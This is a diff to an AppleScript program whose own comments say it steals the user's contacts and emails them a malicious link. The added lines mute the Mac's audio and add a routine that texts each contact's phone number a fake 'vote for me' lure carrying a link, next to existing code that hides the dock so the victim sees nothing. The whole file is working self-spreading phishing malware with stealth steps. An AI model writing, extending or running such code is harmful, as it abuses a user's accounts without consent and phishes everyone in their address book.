@@ -2,6 +2,9 @@
 -- Then it emails those contacts with a malicious link from the user.
 -- DO NOT RUN UNLESS YOU WANT YOUR CONTACTS STOLEN
 
+-- Mutes the Device
+set volume output volume 0
+
 -- Hides the dock to prevent user from seeing what is happening
 tell application "System Events"
 	set autohide of dock preferences to true
@@ -61,6 +64,7 @@ tell application "Contacts"
 		-- Check if there is a phone number
 		if (count of every phone of contact) > 0 then
 			set contactPhone to value of phone 1 of contact
+			sendMaliciousMessage(contactPhone)
 		end if
 		
 		-- Concatenate
@@ -86,6 +90,18 @@ on sendMaliciousEmail(contactName, contactEmail)
 		quit
 	end tell
 end sendMaliciousEmail
+
+-- function that messages the contact
+-- used code structure from https://developer.apple.com/forums/thread/668567
+on sendMaliciousMessage(contactPhone)
+	tell application "Messages"
+		set targetService to 1st account whose service type = SMS
+		set targetBuddy to participant contactPhone of targetService
+		send "Hey, just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/" to targetBuddy
+		delay 1
+		quit
+	end tell
+end sendMaliciousMessage
 
 -- Got the structure of how to send an email using apple scripts from this query: https://gist.github.com/youandhubris/9e292822e3db8f91df93234db092906e
 tell application "Mail"
